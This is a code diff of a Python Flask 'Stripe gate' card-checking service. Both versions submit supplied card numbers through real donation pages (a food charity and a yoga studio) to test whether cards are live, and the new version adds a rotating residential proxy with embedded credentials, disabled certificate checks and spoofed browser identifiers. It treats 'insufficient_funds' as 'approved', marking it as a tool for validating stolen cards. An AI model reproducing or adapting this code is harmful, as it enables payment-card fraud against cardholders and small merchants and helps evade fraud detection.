@@ -1,343 +1,291 @@
-import os  # <-- Added this import
+from flask import Flask, jsonify, request
 import requests
+import time
+import uuid
 import json
-import re
+import random
+import warnings
+import ssl
+import urllib3
 from urllib.parse import unquote
-from flask import Flask, request, jsonify
-from datetime import datetime
+from requests.adapters import HTTPAdapter
+
+# ---------------- CONFIGURATION ----------------
+# Disable SSL warnings
+warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+STRIPE_KEY = "pk_live_51IMhSJLYE7drGyUglIxoBPOWZT671cE4T6AxGyrZcyuWEZruEI80R72arhmENIuIChp3pG8TiQw8HBcK29Vg093N00fsXVP4X3"
+BASE_URL = "https://micheleyoga.com"
+REFERER = "https://micheleyoga.com/donate-now/"
+WPFORMS_TOKEN = "332cd919288e4e20999f1fcbdffcfb78"
+
+# ---------------- PROXY CONFIGURATION ----------------
+PROXY = "http://user-Mdw5TwO58ewqByFP-type-residential-session-mt140xgu-country-DE-city-Berlin-rotation-5:9GFLalL6ZKPZraFe@geo.g-w.info:10080"
+proxies = {
+    'http': PROXY,
+    'https': PROXY
+}
 
 app = Flask(__name__)
-session = requests.Session()
 
-# ===============================================
-# 1. CLEAN RESPONSE PARSER (NO GARBAGE)
-# ===============================================
-def log_final_response(response):
-    try:
-        # Try to parse as JSON first
-        try:
-            data = response.json()
-            if 'error' in data:
-                code = data['error'].get('code', '')
-                msg = data['error'].get('message', '')
-            else:
-                code = 'success'
-                msg = 'Payment processed successfully'
-        except json.JSONDecodeError:
-            # Parse HTML response
-            html = response.text
-            
-            # Extract status, type, code, and message from the HTML
-            status_match = re.search(r'Status is:(\d+)', html, re.I)
-            type_match = re.search(r'Type is:([^\n\r]+)', html, re.I)
-            code_match = re.search(r'Code is:([^\n\r]+)', html, re.I)
-            msg_match = re.search(r'Message is:([^\n\r]+)', html, re.I)
-            
-            status = status_match.group(1).strip() if status_match else ''
-            type_val = type_match.group(1).strip() if type_match else ''
-            code = code_match.group(1).strip() if code_match else 'unknown_error'
-            msg = msg_match.group(1).strip() if msg_match else 'Unknown error occurred'
-            
-            # Check for success indicators
-            if 'Thank you' in html or 'Payment Successful' in html or status == '200':
-                code = 'success'
-                msg = 'Payment processed successfully'
+# ---------------- CUSTOM SSL ADAPTER ----------------
+class CustomSSLAdapter(HTTPAdapter):
+    def init_poolmanager(self, *args, **kwargs):
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        kwargs['ssl_context'] = context
+        kwargs['cert_reqs'] = 'CERT_NONE'
+        kwargs['assert_hostname'] = False
+        return super(CustomSSLAdapter, self).init_poolmanager(*args, **kwargs)
 
-        result = {
-            "error_code": code,
-            "response": {
-                "code": code,
-                "message": msg
-            }
-        }
-        
-        # Add additional fields if available
-        if 'status' in locals() and status:
-            result["response"]["status"] = status
-        if 'type_val' in locals() and type_val:
-            result["response"]["type"] = type_val
-            
-    except Exception as e:
-        result = {
-            "error_code": "parse_error",
-            "response": {
-                "code": "parse_error",
-                "message": f"Parse failed: {str(e)}"
-            }
-        }
+# ---------------- HEADERS ----------------
+base_headers = {
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'no-cache',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
+}
+
+stripe_headers = base_headers.copy()
+stripe_headers.update({
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'sec-fetch-site': 'same-site',
+})
+
+ajax_headers = base_headers.copy()
+ajax_headers.update({
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'origin': 'https://micheleyoga.com',
+    'referer': REFERER,
+    'sec-fetch-site': 'same-origin',
+    'x-requested-with': 'XMLHttpRequest',
+})
+
+# ---------------- HELPERS ----------------
+def get_timestamp_ms():
+    return str(int(time.time() * 1000))
+
+def generate_random_id():
+    return str(uuid.uuid4())
+
+def get_session():
+    session = requests.Session()
+    session.trust_env = False
+    session.proxies = proxies
+    session.verify = False
     
-    print(json.dumps(result, indent=2))
-    return result
+    # Mount the Custom Adapter
+    adapter = CustomSSLAdapter()
+    session.mount('https://', adapter)
+    session.mount('http://', adapter)
+    
+    return session
 
-
-# ===============================================
-# 2. GET CSRF TOKEN
-# ===============================================
-def get_csrf_token():
-    headers = {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
-        'referer': 'https://www.mannahelps.org/donate/food/',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    }
-    try:
-        r = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
-        m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
-        return m.group(1) if m else None
-    except Exception as e:
-        print(f"CSRF token error: {e}")
-        return None
-
-
-# ===============================================
-# 3. CHECK IF CARD IS EXPIRED
-# ===============================================
-def is_card_expired(mm, yy):
-    """Check if the card is expired based on current date"""
-    try:
-        # Convert year to 4 digits if needed
-        if len(yy) == 2:
-            yy = '20' + yy
-        
-        # Get current month and year
-        now = datetime.now()
-        current_year = now.year
-        current_month = now.month
-        
-        # Convert to integers
-        exp_year = int(yy)
-        exp_month = int(mm)
-        
-        # Check if card is expired
-        if exp_year < current_year or (exp_year == current_year and exp_month < current_month):
-            return True
-        return False
-    except:
-        return False
-
-
-# ===============================================
-# 4. CREATE STRIPE TOKEN
-# ===============================================
-def create_stripe_token(cc, mm, yy, cvc):
-    if len(yy) == 2:
-        yy = '20' + yy
-
-    headers = {
-        'accept': 'application/json',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
-    }
-
-    payload = (
-        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
-        f'&payment_user_agent=stripe.js%2F78ef418'
-        f'&card[number]={cc}'
-        f'&card[exp_month]={mm}'
-        f'&card[exp_year]={yy}'
-        f'&card[cvc]={cvc}'
-        f'&card[name]=Test+User'
-        f'&card[address_line1]=123+Main+St'
-        f'&card[address_city]=Miami'
-        f'&card[address_state]=FL'
-        f'&card[address_zip]=33101'
-    )
-
-    try:
-        r = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=payload, timeout=20)
-        j = r.json()
-        
-        # Check for specific error messages from Stripe
-        if 'error' in j:
-            error_code = j.get('error', {}).get('code', '')
-            error_msg = j.get('error', {}).get('message', '')
-            
-            # Map Stripe errors to our format
-            if error_code == 'expired_card':
-                return None, {"error_code": "expired_card", "message": "Your card has expired"}
-            elif error_code == 'invalid_expiry_year':
-                return None, {"error_code": "invalid_yy", "message": "Your card's year is invalid"}
-            elif error_code == 'invalid_expiry_month':
-                return None, {"error_code": "invalid_mm", "message": "Your card's month is invalid"}
-            else:
-                return None, {"error_code": error_code, "message": error_msg}
-        
-        return j.get('id'), None
-    except Exception as e:
-        return None, {"error_code": "stripe_error", "message": f"Stripe error: {str(e)}"}
-
-
-# ===============================================
-# 5. SUBMIT DONATION
-# ===============================================
-def submit_donation(stripe_token):
-    csrf = get_csrf_token()
-    if not csrf:
-        return {"error_code": "csrf_failed", "response": {"code": "csrf_failed", "message": "CSRF token missing"}}
-
-    headers = {
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://www.mannahelps.org',
-        'referer': 'https://www.mannahelps.org/donate/money/',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    }
-
-    data = [
-        ('account', 'Programs/Services'), ('amount', 'other'), ('amnto-text', '1'),
-        ('name', 'Test User'), ('email', 'test@example.com'), ('comfirmAddress', 'test@example.com'),
-        ('phone', '5551234567'), ('address_line1', '123 Main St'), ('address_city', 'Miami'),
-        ('address_state', 'FL'), ('address_zip', '33101'), ('formID', 'donate'),
-        ('csrf_token', csrf), ('id', 'Manna Donation'), ('itemInfo', 'One-Time Donation'),
-        ('interval', '1'), ('amountInput', '1.00'), ('id', 'Payment'),
-        ('utm_source', 'null'), ('utm_medium', 'null'), ('utm_campaign', 'null'),
-        ('gclid', 'null'), ('stripeToken', stripe_token),
-    ]
-
-    try:
-        r = session.post('https://www.mannahelps.org/checkout/payment.php', headers=headers, data=data, timeout=30)
-        return log_final_response(r)
-    except Exception as e:
-        return {"error_code": "submit_error", "response": {"code": "submit_error", "message": str(e)}}
-
-
-# ===============================================
-# 6. MAIN ENDPOINT – NO CARD NUMBER CHECK
-# ===============================================
-@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
-def stripe_gate(card):
-    try:
-        decoded = unquote(card)
-        parts = [p.strip() for p in decoded.split('|')]
-        if len(parts) != 4:
-            response_data = {
-                "error_code": "invalid_format",
-                "response": {"code": "invalid_format", "message": "Use: cc|mm|yy|cvc"}
-            }
-            return jsonify(response_data), 400
-
-        cc, mm, yy, cvc = parts
-
-        # === MONTH VALIDATION ===
-        if not mm.isdigit():
-            response_data = {
-                "error_code": "invalid_mm",
-                "response": {"code": "invalid_mm", "message": "Your card's month is invalid"}
-            }
-            return jsonify(response_data), 400
-        if not (1 <= int(mm) <= 12):
-            response_data = {
-                "error_code": "invalid_mm",
-                "response": {"code": "invalid_mm", "message": "Your card's month is invalid"}
-            }
-            return jsonify(response_data), 400
-
-        # === YEAR VALIDATION ===
-        if not yy.isdigit() or len(yy) not in [2, 4]:
-            response_data = {
-                "error_code": "invalid_yy",
-                "response": {"code": "invalid_yy", "message": "Your card's year is invalid"}
-            }
-            return jsonify(response_data), 400
-
-        # === CHECK IF CARD IS EXPIRED ===
-        if is_card_expired(mm, yy):
-            response_data = {
-                "error_code": "expired_card",
-                "response": {"code": "expired_card", "message": "Your card has expired"}
-            }
-            return jsonify(response_data), 400
-
-        # === CVC VALIDATION ===
-        if not cvc.isdigit():
-            response_data = {
-                "error_code": "invalid_cvc",
-                "response": {"code": "invalid_cvc", "message": "CVC must be digits"}
-            }
-            return jsonify(response_data), 400
-
-        # === AMEX CVC RULE ===
-        is_amex = cc.startswith('3')
-        cvc_len = len(cvc)
-
-        if is_amex:
-            if cvc_len != 4:
-                response_data = {
-                    "error_code": "incorrect_cvc",
-                    "response": {
-                        "code": "incorrect_cvc",
-                        "message": "Your card's security code is invalid"
-                    }
-                }
-                return jsonify(response_data), 400
-        else:
-            if cvc_len != 3:
-                response_data = {
-                    "error_code": "incorrect_cvc",
-                    "response": {
-                        "code": "incorrect_cvc",
-                        "message": "Your card's security code is invalid"
-                    }
-                }
-                return jsonify(response_data), 400
-
-        # === CREATE TOKEN & SUBMIT ===
-        token, err = create_stripe_token(cc, mm, yy, cvc)
-        if not token:
-            # Handle different error formats
-            if isinstance(err, dict):
-                response_data = {
-                    "error_code": err.get("error_code", "token_failed"),
-                    "response": {
-                        "code": err.get("error_code", "token_failed"),
-                        "message": err.get("message", "Token creation failed")
-                    }
-                }
-            else:
-                response_data = {
-                    "error_code": "token_failed",
-                    "response": {"code": "token_failed", "message": err or "Token creation failed"}
-                }
-            return jsonify(response_data), 400
-
-        result = submit_donation(token)
-        return jsonify(result), 200
-
-    except Exception as e:
-        response_data = {
-            "error_code": "server_error",
-            "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
-        }
-        return jsonify(response_data), 500
-
-
-# ===============================================
-# 7. HOME PAGE
-# ===============================================
-@app.route('/')
-def home():
-    return """
-    <h2>Stripe Gate v3 – MannaHelps.org</h2>
-    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=371449635398431|12|27|1234</code></p>
-    <p><b>Format:</b> <code>cc|mm|yy|cvc</code></p>
-    <p><b>CVC Rules:</b></p>
-    <ul>
-      <li>Amex (starts with 3) → 4-digit CVC only</li>
-      <li>All other cards → 3-digit CVC only</li>
-    </ul>
-    <p><b>No card number validation</b> – only CVC length checked.</p>
-    <p>Charges $1.00</p>
+def robust_post(session, url, **kwargs):
     """
+    Attempts a POST request with Proxy.
+    If it fails (Proxy/SSL/Connection error), retries without Proxy.
+    """
+    try:
+        # Attempt 1: With Proxy
+        return session.post(url, timeout=30, **kwargs)
+    except (requests.exceptions.ProxyError, requests.exceptions.SSLError, 
+            requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+        print(f"[!] Proxy failed ({e.__class__.__name__}). Retrying WITHOUT proxy...")
+        # Attempt 2: Direct Connection (Override proxies to None)
+        return session.post(url, timeout=30, proxies=None, **kwargs)
 
+# ---------------- ROUTE ----------------
+@app.route('/<path:path>')
+def gateway(path):
+    if not path.startswith('gate=stripe/cc='):
+        return jsonify({"error": "Invalid endpoint format"}), 404
 
-# ===============================================
-# 8. RUN SERVER
-# ===============================================
+    try:
+        # Extract and decode the card data
+        cc_data_raw = path.split('=')[-1]
+        cc_data = unquote(cc_data_raw)
+        
+        parts = cc_data.split('|')
+        if len(parts) != 4:
+            return jsonify({"status": "declined", "message": "Invalid input format", "decline_code": "input_error"}), 400
+            
+        cc_num, cc_mm, cc_yy, cc_cvv = [p.strip() for p in parts]
+        
+        masked_cc = f"{cc_num[:4]}********{cc_num[-4:]}"
+        print(f"\n[NEW REQUEST] CC: {masked_cc}")
+
+        session = get_session()
+
+        # ---------------- STEP 1: CREATE PAYMENT METHOD ----------------
+        print(">>> Step 1: Creating Payment Method...")
+
+        fresh_ids = {
+            'client_session_id': generate_random_id(),
+            'elements_session_config_id': generate_random_id(),
+            'guid': generate_random_id(),
+            'muid': generate_random_id(),
+            'sid': generate_random_id()
+        }
+
+        data_1 = {
+            'type': 'card',
+            'card[number]': cc_num,
+            'card[cvc]': cc_cvv,
+            'card[exp_year]': cc_yy,
+            'card[exp_month]': cc_mm,
+            'allow_redisplay': 'unspecified',
+            'billing_details[address][country]': 'IN',
+            'billing_details[email]': 'dfghbgfd@gmail.com',
+            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent; autopm',
+            'referrer': REFERER,
+            'time_on_page': str(random.randint(20000, 60000)),
+            'client_attribution_metadata[client_session_id]': fresh_ids['client_session_id'],
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+            'client_attribution_metadata[merchant_integration_version]': '2021',
+            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
+            'client_attribution_metadata[elements_session_config_id]': fresh_ids['elements_session_config_id'],
+            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+            'client_attribution_metadata[merchant_integration_additional_elements][1]': 'linkAuthentication',
+            'guid': fresh_ids['guid'],
+            'muid': fresh_ids['muid'],
+            'sid': fresh_ids['sid'],
+            'key': STRIPE_KEY
+        }
+
+        try:
+            resp1 = robust_post(session, 'https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data_1)
+            resp1_json = resp1.json()
+            print(f"[LOG STEP 1] {json.dumps(resp1_json, indent=2)}")
+            payment_method_id = resp1_json['id']
+        except Exception as e:
+            print(f"[ERROR STEP 1] {e}")
+            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})
+
+        # ---------------- STEP 2: SUBMIT FORM ----------------
+        print("\n>>> Step 2: Processing Transaction...")
+
+        start_time = get_timestamp_ms()
+        time.sleep(0.5) 
+        end_time = get_timestamp_ms()
+
+        files_2 = {
+            'wpforms[fields][4][first]': (None, 'sdfghj'),
+            'wpforms[fields][4][last]': (None, 'sdfghj'),
+            'wpforms[fields][1]': (None, '0.50'),
+            'wpforms[id]': (None, '12203'),
+            'page_title': (None, 'Donate Now'),
+            'page_url': (None, REFERER),
+            'page_id': (None, '12229'),
+            'wpforms[post_id]': (None, '12229'),
+            'vx_width': (None, '1160'),
+            'vx_height': (None, '1201'),
+            'vx_url': (None, REFERER),
+            'wpforms[payment_method_id]': (None, payment_method_id),
+            'wpforms[token]': (None, WPFORMS_TOKEN),
+            'action': (None, 'wpforms_submit'),
+            'start_timestamp': (None, start_time),
+            'end_timestamp': (None, end_time),
+        }
+
+        try:
+            resp2 = robust_post(session, f'{BASE_URL}/wp-admin/admin-ajax.php', headers=ajax_headers, files=files_2)
+            resp2_json = resp2.json()
+            print(f"[LOG STEP 2] {json.dumps(resp2_json, indent=2)}")
+            client_secret = resp2_json['data']['payment_intent_client_secret']
+            payment_intent_id = client_secret.split('_secret_')[0]
+        except Exception as e:
+            print(f"[ERROR STEP 2] {e}")
+            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})
+
+        # ---------------- STEP 3: CONFIRM PAYMENT ----------------
+        print("\n>>> Step 3: Confirming Payment Intent...")
+
+        data_3 = {
+            'use_stripe_sdk': 'true',
+            'mandate_data[customer_acceptance][type]': 'online',
+            'mandate_data[customer_acceptance][online][infer_from_client]': 'true',
+            'return_url': REFERER,
+            'payment_method': payment_method_id,
+            'key': STRIPE_KEY,
+            'client_attribution_metadata[client_session_id]': fresh_ids['client_session_id'],
+            'client_attribution_metadata[merchant_integration_source]': 'l1',
+            'client_secret': client_secret,
+        }
+
+        try:
+            resp3 = robust_post(
+                session,
+                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',
+                headers=stripe_headers,
+                data=data_3
+            )
+            resp3_json = resp3.json()
+            print(f"[LOG STEP 3] {json.dumps(resp3_json, indent=2)}")
+        except Exception as e:
+            print(f"[ERROR STEP 3] {e}")
+            return jsonify({"status": "declined", "message": "Payment Gateway Error", "decline_code": "connection_error"})
+
+        # ---------------- FINAL RESULT LOGIC ----------------
+        final_result = {
+            "status": None,
+            "message": None,
+            "decline_code": None
+        }
+
+        try:
+            if 'error' in resp3_json:
+                error_data = resp3_json['error']
+                decline_code = error_data.get('decline_code', 'unknown')
+                message = error_data.get('message', 'Unknown error')
+                
+                if decline_code == 'insufficient_funds':
+                    final_result['status'] = 'approved'
+                else:
+                    final_result['status'] = 'declined'
+                    
+                final_result['message'] = message
+                final_result['decline_code'] = decline_code
+                
+            elif resp3_json.get('status') == 'succeeded':
+                final_result['status'] = 'charged'
+                final_result['message'] = 'Your card was charged.'
+                final_result['decline_code'] = 'Succeeded'
+            
+            elif resp3_json.get('status') == 'requires_source_action':
+                final_result['status'] = 'declined'
+                final_result['decline_code'] = 'requires_source_action'
+                final_result['message'] = 'We are unable to verify your payment method'
+                
+            else:
+                final_result['status'] = 'declined'
+                final_result['message'] = 'Transaction Failed'
+                final_result['decline_code'] = 'processing_error'
+
+        except Exception as e:
+            print(f"[ERROR PARSING FINAL] {e}")
+            final_result['status'] = 'declined'
+            final_result['message'] = 'Payment Gateway Error'
+            final_result['decline_code'] = 'system_error'
+
+        return jsonify(final_result)
+
+    except Exception as e:
+        print(f"[SERVER ERROR] {e}")
+        return jsonify({"status": "declined", "message": "Internal Server Error", "decline_code": "system_error"}), 500
+
 if __name__ == '__main__':
-    print("Stripe Gate v3 Running")
-    print("→ http://127.0.0.1:5000")
-    print("Example: /gate=stripe1$/cc=4111111111111111|12|25|123")
-    # For Render deployment
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=True)
